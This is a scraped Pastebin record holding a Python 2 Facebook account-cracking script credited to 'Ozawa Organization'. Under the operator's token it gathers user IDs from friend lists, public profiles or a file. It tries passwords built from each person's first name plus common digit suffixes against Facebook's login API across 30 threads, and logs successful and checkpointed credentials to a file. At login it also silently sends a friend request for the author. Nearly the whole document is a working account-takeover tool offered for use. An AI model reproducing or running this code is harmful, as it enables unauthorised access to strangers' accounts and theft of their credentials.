{
    "scrape_url": "https://scrape.pastebin.com/api_scrape_item.php?i=tRa7VqAj",
    "full_url": "https://pastebin.com/tRa7VqAj",
    "date": "1594909696",
    "key": "tRa7VqAj",
    "size": 17012,
    "expire": "0",
    "title": "white fb, wala ng dark... out of stock na",
    "syntax": "python",
    "user": "phsoull",
    "filename": "tRa7VqAj",
    "pasteid": "tRa7VqAj",
    "pastesite": "pastebin.com",
    "@timestamp": "2020-07-16T14:28:16",
    "MD5": "0397de376693baeb63341c68276bb4af",
    "SHA256": "1b63da1c7847b8941562e71e041afa3771702b5706aaf145c900a8dfe06e3ea6",
    "raw_paste": "#!/usr/bin/python2\r\n#coding=utf-8\r\n\r\n\r\nimport os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize\r\nfrom multiprocessing.pool import ThreadPool\r\nfrom requests.exceptions import ConnectionError\r\nfrom mechanize import Browser\r\n\r\n\r\nreload(sys)\r\nsys.setdefaultencoding('utf8')\r\nbr = mechanize.Browser()\r\nbr.set_handle_robots(False)\r\nbr.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)\r\nbr.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]\r\n\r\n\r\ndef keluar():\r\n\tprint \"\\033[1;96m[!] \\x1b[1;91mExit\"\r\n\tos.sys.exit()\r\n\r\n\r\ndef acak(b):\r\n    w = 'ahtdzjc'\r\n    d = ''\r\n    for i in x:\r\n        d += '!'+w[random.randint(0,len(w)-1)]+i\r\n    return cetak(d)\r\n\r\n\r\ndef cetak(b):\r\n    w = 'ahtdzjc'\r\n    for i in w:\r\n        j = w.index(i)\r\n        x= x.replace('!%s'%i,'\\033[%s;1m'%str(31+j))\r\n    x += '\\033[0m'\r\n    x = x.replace('!0','\\033[0m')\r\n    sys.stdout.write(x+'\\n')\r\n\r\n\r\ndef jalan(z):\r\n\tfor e in z + '\\n':\r\n\t\tsys.stdout.write(e)\r\n\t\tsys.stdout.flush()\r\n\t\ttime.sleep(00000.1)\r\n\r\n##### LOGO #####\r\nlogo = \"\"\" \u2584\ufe3b\u253b\u2550\u2533\u4e00 \u0429\u0454Lc\u0e4fM\u0454 \u253c\u0e4f \u253c\u0452\u0454 F\u0105\u015f\u253c\u0454\u015f\u253c \u0454V\u0454r cL\u0e4f\u0419I\u0419G\r\n           \u2584\ufe3b\u253b\u2550\u2533\u4e00 \u2665\ufe0fModified By OzawaOrg\u2665\ufe0f----------\ud83d\udd34\r\n           \u2584\ufe3b\u253b\u2550\u2533\u4e00 \u2665\ufe0f\u2665\ufe0f Ozawa Organization \u2665\ufe0f\u2665\ufe0f----\ud83d\udd34\ud83d\udd34\r\n           \u2584\ufe3b\u253b\u2550\u2533\u4e00    \ud83d\udcaa\ud83d\udcaaOzawa Lang malakas\ud83d\udcaa\ud83d\udcaa   \ud83d\udd34\ud83d\udd34\r\n           \u2584\ufe3b\u253b\u2550\u2533\u4e00 ---- F\u0454\u0454L \u253c\u0452\u0454 P\u0e4f\u0429\u0454r   --------\ud83d\udd34\ud83d\udd34\r\n\t          \u0429\u0454Lc\u0e4fM\u0454 \u253c\u0e4f \u0426\u0419LIMI\u253c\u0454\u0111 cL\u0e4f\u0419I\u0419G\r\n          \r\n   Warning: Don't use your personal account.                                             \r\n   Warning: Use a Fresh Account to log in safely.\r\n   Warning: Wait 20 minutes to get clone Account.\r\n\\033[1;91m=======================================\r\n\\033[1;96mAuthor  \\033[1;93m: \\033[1;92m Densoull Lien Ozawa\r\n\\033[1;96mGroup \\033[1;93m: \\033[1; 0zawa Organization\r\n\\033[1;91m=======================================\"\"\"\r\n\r\ndef tik():\r\n\ttitik = ['.   ','..  ','... ']\r\n\tfor o in titik:\r\n\t\tprint(\"\\r\\033[1;96m[\u25cf] \\x1b[1;93mSedang masuk \\x1b[1;97m\"+o),;sys.stdout.flush();time.sleep(1)\r\n\r\n\r\nback = 0\r\nberhasil = []\r\ncekpoint = []\r\noks = []\r\nid = []\r\nlistgrup = []\r\nvulnot = \"\\033[31mNot Vuln\"\r\nvuln = \"\\033[32mVuln\"\r\n\r\nos.system(\"clear\")\r\nprint \"\\033[1;96m =============================================================\"\r\nprint  \"\"\"\\033[1;91m=======================================\r\n\\033[1;96mAuthor  \\033[1;93m: \\033[1;92m Densoull Lien Ozawa\r\n\\033[1;96mGroup \\033[1;93m: \\033[1;92m Ozawa Organization\r\n\\033[1;91m=======================================\"\"\"\r\nprint \" \\x1b[1;93m=============================================================\"\r\n\r\nCorrectUsername = \"soull\"\r\nCorrectPassword = \"soull\"\r\n\r\nloop = 'true'\r\nwhile (loop == 'true'):\r\n    username = raw_input(\"\\033[1;96m[\u2606] \\x1b[1;93mUsername Of Tool \\x1b[1;96m>>>> \")\r\n    if (username == CorrectUsername):\r\n    \tpassword = raw_input(\"\\033[1;96m[\u2606] \\x1b[1;93mPassword Of Tool \\x1b[1;96m>>>> \")\r\n        if (password == CorrectPassword):\r\n            print \"Logged in successfully as \" + username\r\n            loop = 'false'\r\n        else:\r\n            print \"Wrong Password\"\r\n            os.system('xdg-open https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ')\r\n    else:\r\n        print \"Wrong Username\"\r\n        os.system('xdg-open https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ')\r\n\r\ndef login():\r\n\tos.system('clear')\r\n\ttry:\r\n\t\ttoket = open('login.txt','r')\r\n\t\tmenu() \r\n\texcept (KeyError,IOError):\r\n\t\tos.system('clear')\r\n\t\tprint logo\r\n\t\tprint 42*\"\\033[1;96m=\"\r\n\t\tprint('\\033[1;96m[\u2606] \\x1b[1;93mLOGIN WITH FACEBOOK \\x1b[1;96m[\u2606]' )\r\n\t\tid = raw_input('\\033[1;96m[+] \\x1b[1;93mID/Email \\x1b[1;91m: \\x1b[1;92m')\r\n\t\tpwd = raw_input('\\033[1;96m[+] \\x1b[1;93mPassword \\x1b[1;91m: \\x1b[1;92m')\r\n\t\ttik()\r\n\t\ttry:\r\n\t\t\tbr.open('https://m.facebook.com')\r\n\t\texcept mechanize.URLError:\r\n\t\t\tprint\"\\n\\033[1;96m[!] \\x1b[1;91mThere is no internet connection\"\r\n\t\t\tkeluar()\r\n\t\tbr._factory.is_html = True\r\n\t\tbr.select_form(nr=0)\r\n\t\tbr.form['email'] = id\r\n\t\tbr.form['pass'] = pwd\r\n\t\tbr.submit()\r\n\t\turl = br.geturl()\r\n\t\tif 'save-device' in url:\r\n\t\t\ttry:\r\n\t\t\t\tsig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'\r\n\t\t\t\tdata = {\"api_key\":\"882a8490361da98702bf97a021ddc14d\",\"credentials_type\":\"password\",\"email\":id,\"format\":\"JSON\", \"generate_machine_id\":\"1\",\"generate_session_cookies\":\"1\",\"locale\":\"en_US\",\"method\":\"auth.login\",\"password\":pwd,\"return_ssl_resources\":\"0\",\"v\":\"1.0\"}\r\n\t\t\t\tx=hashlib.new(\"md5\")\r\n\t\t\t\tx.update(sig)\r\n\t\t\t\ta=x.hexdigest()\r\n\t\t\t\tdata.update({'sig':a})\r\n\t\t\t\turl = \"https://api.facebook.com/restserver.php\"\r\n\t\t\t\tr=requests.get(url,params=data)\r\n\t\t\t\tz=json.loads(r.text)\r\n\t\t\t\tunikers = open(\"login.txt\", 'w')\r\n\t\t\t\tunikers.write(z['access_token'])\r\n\t\t\t\tunikers.close()\r\n\t\t\t\tprint '\\n\\033[1;96m[\u2713] \\x1b[1;92mLogin Successful'\r\n\t\t\t\tos.system('xdg-open https://www.Facebook.com/komail.khan.3781')\r\n\t\t\t\trequests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])\r\n\t\t\t\tmenu()\r\n\t\t\texcept requests.exceptions.ConnectionError:\r\n\t\t\t\tprint\"\\n\\033[1;96m[!] \\x1b[1;91mThere is no internet connection\"\r\n\t\t\t\tkeluar()\r\n\t\tif 'checkpoint' in url:\r\n\t\t\tprint(\"\\n\\033[1;96m[!] \\x1b[1;91mIt seems that your account has a checkpoint\")\r\n\t\t\tos.system('rm -rf login.txt')\r\n\t\t\ttime.sleep(1)\r\n\t\t\tkeluar()\r\n\t\telse:\r\n\t\t\tprint(\"\\n\\033[1;96m[!] \\x1b[1;91mPassword/Email is wrong\")\r\n\t\t\tos.system('rm -rf login.txt')\r\n\t\t\ttime.sleep(1)\r\n\t\t\tlogin()\r\n\r\n\r\ndef menu():\r\n\tos.system('clear')\r\n\ttry:\r\n\t\ttoket=open('login.txt','r').read()\r\n\texcept IOError:\r\n\t\tos.system('clear')\r\n\t\tprint\"\\033[1;96m[!] \\x1b[1;91mToken invalid\"\r\n\t\tos.system('rm -rf login.txt')\r\n\t\ttime.sleep(1)\r\n\t\tlogin()\r\n\ttry:\r\n\t\totw = requests.get('https://graph.facebook.com/me?access_token='+toket)\r\n\t\ta = json.loads(otw.text)\r\n\t\tnama = a['name']\r\n\t\tid = a['id']\r\n\texcept KeyError:\r\n\t\tos.system('clear')\r\n\t\tprint\"\\033[1;96m[!] \\033[1;91mIt seems that your account has a checkpoint\"\r\n\t\tos.system('rm -rf login.txt')\r\n\t\ttime.sleep(1)\r\n\t\tlogin()\r\n\texcept requests.exceptions.ConnectionError:\r\n\t\tprint\"\\033[1;96m[!] \\x1b[1;91mThere is no internet connection\"\r\n\t\tkeluar()\r\n\tos.system(\"clear\")\r\n\tprint logo\r\n\tprint 42*\"\\033[1;96m=\"\r\n\tprint \"\\033[1;96m[\\033[1;97m\u2713\\033[1;96m]\\033[1;93m Name \\033[1;91m: \\033[1;92m\"+nama+\"\\033[1;97m               \"\r\n\tprint \"\\033[1;96m[\\033[1;97m\u2713\\033[1;96m]\\033[1;93m ID   \\033[1;91m: \\033[1;92m\"+id+\"\\x1b[1;97m              \"\r\n\tprint 42*\"\\033[1;96m=\"\r\n\tprint \"\\x1b[1;96m[\\x1b[1;92m1\\x1b[1;96m]\\x1b[1;93m Start Hacking\"\r\n\tprint \"\\x1b[1;96m[\\x1b[1;91m0\\x1b[1;96m]\\x1b[1;91m Exit            \"\r\n\tpilih()\r\n\r\n\r\ndef pilih():\r\n\tunikers = raw_input(\"\\n\\033[1;97m >>> \\033[1;97m\")\r\n\tif unikers ==\"\":\r\n\t\tprint \"\\033[1;96m[!] \\x1b[1;91mFill in correctly\"\r\n\t\tpilih()\r\n\telif unikers ==\"1\":\r\n\t\tsuper()\r\n\telif unikers ==\"0\":\r\n\t\tjalan('Token Removed')\r\n\t\tos.system('rm -rf login.txt')\r\n\t\tkeluar()\r\n\telse:\r\n\t\tprint \"\\033[1;96m[!] \\x1b[1;91mFill in correctly\"\r\n\t\tpilih()\r\n\r\n\r\ndef super():\r\n\tglobal toket\r\n\tos.system('clear')\r\n\ttry:\r\n\t\ttoket=open('login.txt','r').read()\r\n\texcept IOError:\r\n\t\tprint\"\\033[1;96m[!] \\x1b[1;91mToken invalid\"\r\n\t\tos.system('rm -rf login.txt')\r\n\t\ttime.sleep(1)\r\n\t\tlogin()\r\n\tos.system('clear')\r\n\tprint logo\r\n\tprint 42*\"\\033[1;96m=\"\r\n\tprint \"\\x1b[1;96m[\\x1b[1;92m1\\x1b[1;96m]\\x1b[1;93m Crack From Friend List\"\r\n\tprint \"\\x1b[1;96m[\\x1b[1;92m2\\x1b[1;96m]\\x1b[1;93m Crack From Any Public ID\"\r\n\tprint \"\\x1b[1;96m[\\x1b[1;92m3\\x1b[1;96m]\\x1b[1;93m Crack From File\"\r\n\tprint \"\\x1b[1;96m[\\x1b[1;91m0\\x1b[1;96m]\\x1b[1;91m Back\"\r\n\tpilih_super()\r\n\r\ndef pilih_super():\r\n\tpeak = raw_input(\"\\n\\033[1;97m >>> \\033[1;97m\")\r\n\tif peak ==\"\":\r\n\t\tprint \"\\033[1;96m[!] \\x1b[1;91mFill in correctly\"\r\n\t\tpilih_super()\r\n\telif peak ==\"1\":\r\n\t\tos.system('clear')\r\n\t\tprint logo\r\n\t\tprint 42*\"\\033[1;96m=\"\r\n\t\tjalan('\\033[1;96m[\u273a] \\033[1;93mGetting ID \\033[1;97m...')\r\n\t\tr = requests.get(\"https://graph.facebook.com/me/friends?access_token=\"+toket)\r\n\t\tz = json.loads(r.text)\r\n\t\tfor s in z['data']:\r\n\t\t\tid.append(s['id'])\r\n\telif peak ==\"2\":\r\n\t\tos.system('clear')\r\n\t\tprint logo\r\n\t\tprint 42*\"\\033[1;96m=\"\r\n\t\tidt = raw_input(\"\\033[1;96m[+] \\033[1;93mEnter ID \\033[1;91m: \\033[1;97m\")\r\n\t\ttry:\r\n\t\t\tjok = requests.get(\"https://graph.facebook.com/\"+idt+\"?access_token=\"+toket)\r\n\t\t\top = json.loads(jok.text)\r\n\t\t\tprint\"\\033[1;96m[\\033[1;97m\u2713\\033[1;96m] \\033[1;93mName\\033[1;91m :\\033[1;97m \"+op[\"name\"]\r\n\t\texcept KeyError:\r\n\t\t\tprint\"\\033[1;96m[!] \\x1b[1;91mID Not Found!\"\r\n\t\t\traw_input(\"\\n\\033[1;96m[\\033[1;97mBack\\033[1;96m]\")\r\n\t\t\tsuper()\r\n\t\tjalan('\\033[1;96m[\u273a] \\033[1;93mGetting IDs \\033[1;97m...')\r\n\t\tr = requests.get(\"https://graph.facebook.com/\"+idt+\"/friends?access_token=\"+toket)\r\n\t\tz = json.loads(r.text)\r\n\t\tfor i in z['data']:\r\n\t\t\tid.append(i['id'])\r\n\telif peak ==\"3\":\r\n\t\tos.system('clear')\r\n\t\tprint logo\r\n\t\tprint 42*\"\\033[1;96m=\"\r\n\t\ttry:\r\n\t\t\tidlist = raw_input('\\x1b[1;96m[+] \\x1b[1;93mEnter File Path  \\x1b[1;91m: \\x1b[1;97m')\r\n\t\t\tfor line in open(idlist,'r').readlines():\r\n\t\t\t\tid.append(line.strip())\r\n\t\texcept IOError:\r\n\t\t\tprint '\\x1b[1;96m[!] \\x1b[1;91mFile Not Found'\r\n\t\t\traw_input('\\n\\x1b[1;96m[ \\x1b[1;97mBack \\x1b[1;96m]')\r\n\t\t\tsuper()\r\n\telif peak ==\"0\":\r\n\t\tmenu()\r\n\telse:\r\n\t\tprint \"\\033[1;96m[!] \\x1b[1;91mFill in correctly\"\r\n\t\tpilih_super()\r\n\t\r\n\tprint \"\\033[1;96m[+] \\033[1;93mTotal IDs \\033[1;91m: \\033[1;97m\"+str(len(id))\r\n\tjalan('\\033[1;96m[\u273a] \\033[1;93mStarting \\033[1;97m...')\r\n\ttitik = ['.   ','..  ','... ']\r\n\tfor o in titik:\r\n\t\tprint(\"\\r\\033[1;96m[\\033[1;97m\u2738\\033[1;96m] \\033[1;93mCracking \\033[1;97m\"+o),;sys.stdout.flush();time.sleep(1)\r\n\tprint\r\n\tprint('\\x1b[1;96m[!] \\x1b[1;93mTo Stop Process Press CTRL Then Press z')\r\n\tprint 42*\"\\033[1;96m=\"\r\n\t\r\n\t\t\t\r\n\tdef main(arg):\r\n\t\tglobal cekpoint,oks\r\n\t\tuser = arg\r\n\t\ttry:\r\n\t\t\tos.mkdir('out')\r\n\t\texcept OSError:\r\n\t\t\tpass\r\n\t\ttry:\r\n\t\t\ta = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)\r\n\t\t\tb = json.loads(a.text)\r\n\t\t\tpass1 = b['first_name']+ '123456'\r\n\t\t\tdata = urllib.urlopen(\"https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=\"+(user)+\"&locale=en_US&password=\"+(pass1)+\"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6\")\r\n\t\t\tq = json.load(data)\r\n\t\t\tif 'access_token' in q:\r\n\t\t\t\tprint '\\x1b[1;96m[\\x1b[1;92mSuccessful\\x1b[1;96m]\\x1b[1;97m ' + user + ' \\x1b[1;96m|\\x1b[1;97m ' + pass1\r\n\t\t\t\toks.append(user+pass1)\r\n\t\t\telse:\r\n\t\t\t\tif 'www.facebook.com' in q[\"error_msg\"]:\r\n\t\t\t\t\tprint '\\x1b[1;96m[\\x1b[1;93mCheckpoint\\x1b[1;96m]\\x1b[1;97m ' + user + ' \\x1b[1;96m|\\x1b[1;97m ' + pass1\r\n\t\t\t\t\tcek = open(\"out/checkpoint.txt\", \"a\")\r\n\t\t\t\t\tcek.write(user+\"|\"+pass1+\"\\n\")\r\n\t\t\t\t\tcek.close()\r\n\t\t\t\t\tcekpoint.append(user+pass1)\r\n\t\t\t\telse:\r\n\t\t\t\t\tpass2 = b['first_name']+ '11'\r\n\t\t\t\t\tdata = urllib.urlopen(\"https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=\"+(user)+\"&locale=en_US&password=\"+(pass2)+\"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6\")\r\n\t\t\t\t\tq = json.load(data)\r\n\t\t\t\t\tif 'access_token' in q:\r\n\t\t\t\t\t\tprint '\\x1b[1;96m[\\x1b[1;92mSuccessful\\x1b[1;96m]\\x1b[1;97m ' + user + ' \\x1b[1;96m|\\x1b[1;97m ' + pass2\r\n\t\t\t\t\t\toks.append(user+pass2)\r\n\t\t\t\t\telse:\r\n\t\t\t\t\t\tif 'www.facebook.com' in q[\"error_msg\"]:\r\n\t\t\t\t\t\t\tprint '\\x1b[1;96m[\\x1b[1;93mCheckpoint\\x1b[1;96m]\\x1b[1;97m ' + user + ' \\x1b[1;96m|\\x1b[1;97m ' + pass2\r\n\t\t\t\t\t\t\tcek = open(\"out/checkpoint.txt\", \"a\")\r\n\t\t\t\t\t\t\tcek.write(user+\"|\"+pass2+\"\\n\")\r\n\t\t\t\t\t\t\tcek.close()\r\n\t\t\t\t\t\t\tcekpoint.append(user+pass2)\r\n\t\t\t\t\t\telse:\r\n\t\t\t\t\t\t\tpass3 = b['first_name'] + '12'\r\n\t\t\t\t\t\t\tdata = urllib.urlopen(\"https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=\"+(user)+\"&locale=en_US&password=\"+(pass3)+\"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6\")\r\n\t\t\t\t\t\t\tq = json.load(data)\r\n\t\t\t\t\t\t\tif 'access_token' in q:\r\n\t\t\t\t\t\t\t\tprint '\\x1b[1;96m[\\x1b[1;92mSuccessful\\x1b[1;96m]\\x1b[1;97m ' + user + ' \\x1b[1;96m|\\x1b[1;97m ' + pass3\r\n\t\t\t\t\t\t\t\toks.append(user+pass3)\r\n\t\t\t\t\t\t\telse:\r\n\t\t\t\t\t\t\t\tif 'www.facebook.com' in q[\"error_msg\"]:\r\n\t\t\t\t\t\t\t\t\tprint '\\x1b[1;96m[\\x1b[1;93mCheckpoint\\x1b[1;96m]\\x1b[1;97m ' + user + ' \\x1b[1;96m|\\x1b[1;97m ' + pass3\r\n\t\t\t\t\t\t\t\t\tcek = open(\"out/checkpoint.txt\", \"a\")\r\n\t\t\t\t\t\t\t\t\tcek.write(user+\"|\"+pass3+\"\\n\")\r\n\t\t\t\t\t\t\t\t\tcek.close()\r\n\t\t\t\t\t\t\t\t\tcekpoint.append(user+pass3)\r\n\t\t\t\t\t\t\t\telse:\r\n\t\t\t\t\t\t\t\t\tpass4 = b['first_name'] + '123'\r\n\t\t\t\t\t\t\t\t\tdata = urllib.urlopen(\"https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=\"+(user)+\"&locale=en_US&password=\"+(pass4)+\"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6\")\r\n\t\t\t\t\t\t\t\t\tq = json.load(data)\r\n\t\t\t\t\t\t\t\t\tif 'access_token' in q:\r\n\t\t\t\t\t\t\t\t\t\tprint '\\x1b[1;96m[\\x1b[1;92mSuccessful\\x1b[1;96m]\\x1b[1;97m ' + user + ' \\x1b[1;96m|\\x1b[1;97m ' + pass4\r\n\t\t\t\t\t\t\t\t\t\toks.append(user+pass4)\r\n\t\t\t\t\t\t\t\t\telse:\r\n\t\t\t\t\t\t\t\t\t\tif 'www.facebook.com' in q[\"error_msg\"]:\r\n\t\t\t\t\t\t\t\t\t\t\tprint '\\x1b[1;96m[\\x1b[1;93mCheckpoint\\x1b[1;96m]\\x1b[1;97m ' + user + ' \\x1b[1;96m|\\x1b[1;97m ' + pass4\r\n\t\t\t\t\t\t\t\t\t\t\tcek = open(\"out/checkpoint.txt\", \"a\")\r\n\t\t\t\t\t\t\t\t\t\t\tcek.write(user+\"|\"+pass4+\"\\n\")\r\n\t\t\t\t\t\t\t\t\t\t\tcek.close()\r\n\t\t\t\t\t\t\t\t\t\t\tcekpoint.append(user+pass4)\r\n\t\t\t\t\t\t\t\t\t\telse:\r\n\t\t\t\t\t\t\t\t\t\t\tpass5 = b['first_name'] + '1234'\r\n\t\t\t\t\t\t\t\t\t\t\tdata = urllib.urlopen(\"https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=\"+(user)+\"&locale=en_US&password=\"+(pass5)+\"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6\")\r\n\t\t\t\t\t\t\t\t\t\t\tq = json.load(data)\r\n\t\t\t\t\t\t\t\t\t\t\tif 'access_token' in q:\r\n\t\t\t\t\t\t\t\t\t\t\t\tprint '\\x1b[1;96m[\\x1b[1;92mSuccessful\\x1b[1;96m]\\x1b[1;97m ' + user + ' \\x1b[1;96m|\\x1b[1;97m ' + pass5\r\n\t\t\t\t\t\t\t\t\t\t\t\toks.append(user+pass5)\r\n\t\t\t\t\t\t\t\t\t\t\telse:\r\n\t\t\t\t\t\t\t\t\t\t\t\tif 'www.facebook.com' in q[\"error_msg\"]:\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tprint '\\x1b[1;96m[\\x1b[1;93mCheckpoint\\x1b[1;96m]\\x1b[1;97m ' + user + ' \\x1b[1;96m|\\x1b[1;97m ' + pass5\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tcek = open(\"out/checkpoint.txt\", \"a\")\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tcek.write(user+\"|\"+pass5+\"\\n\")\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tcek.close()\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tcekpoint.append(user+pass5)\r\n\t\t\t\t\t\t\t\t\t\t\t\telse:\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tpass6 = b['first_name'] + '12345'\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tdata = urllib.urlopen(\"https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=\"+(user)+\"&locale=en_US&password=\"+(pass6)+\"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6\")\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tq = json.load(data)\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tif 'access_token' in q:\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tprint '\\x1b[1;96m[\\x1b[1;92mSuccessful\\x1b[1;96m]\\x1b[1;97m ' + user + ' \\x1b[1;96m|\\x1b[1;97m ' + pass6\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\toks.append(user+pass6)\r\n\t\t\t\t\t\t\t\t\t\t\t\t\telse:\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tif 'www.facebook.com' in q[\"error_msg\"]:\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tprint '\\x1b[1;96m[\\x1b[1;93mCheckpoint\\x1b[1;96m]\\x1b[1;97m ' + user + ' \\x1b[1;96m|\\x1b[1;97m ' + pass6\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcek = open(\"out/checkpoint.txt\", \"a\")\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcek.write(user+\"|\"+pass6+\"\\n\")\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcek.close()\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcekpoint.append(user+pass6)\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\telse:\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\ta = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tb = json.loads(a.text)\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tpass7 = b['first_name'] + '09'\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tdata = urllib.urlopen(\"https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=\"+(user)+\"&locale=en_US&password=\"+(pass7)+\"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6\")\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tq = json.load(data)\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif 'access_token' in q:\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tprint '\\x1b[1;96m[\\x1b[1;92mSuccessful\\x1b[1;96m]\\x1b[1;97m ' + user + ' \\x1b[1;96m|\\x1b[1;97m ' + pass7\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\toks.append(user+pass7)\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\telse:\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif 'www.facebook.com' in q[\"error_msg\"]:\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tprint '\\x1b[1;96m[\\x1b[1;93mCheckpoint\\x1b[1;96m]\\x1b[1;97m ' + user + ' \\x1b[1;96m|\\x1b[1;97m ' + pass7\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcek = open(\"out/checkpoint.txt\", \"a\")\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcek.write(user+\"|\"+pass7+\"\\n\")\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcek.close()\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcekpoint.append(user+pass7)\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\r\n\t\texcept:\r\n\t\t\tpass\r\n\t\t\r\n\tp = ThreadPool(30)\r\n\tp.map(main, id)\r\n\tprint 42*\"\\033[1;96m=\"\r\n\tprint '\\033[1;96m[\\033[1;97m\u2713\\033[1;96m] \\033[1;92mProcess Has Been Completed \\033[1;97m....'\r\n\tprint\"\\033[1;96m[+] \\033[1;92mTotal OK/\\x1b[1;93mCP \\033[1;91m: \\033[1;92m\"+str(len(oks))+\"\\033[1;97m/\\033[1;93m\"+str(len(cekpoint))\r\n\tprint(\"\\033[1;96m[+] \\033[1;92mCP File Has Been Saved \\033[1;91m: \\033[1;97mout/checkpoint.txt\")\r\n\traw_input(\"\\n\\033[1;96m[\\033[1;97mBack\\033[1;96m]\")\r\n\tmenu()\r\n\r\nif __name__ == '__main__':\r\n\tlogin()",
    "YaraRule": [
        "generic_api"
    ]
}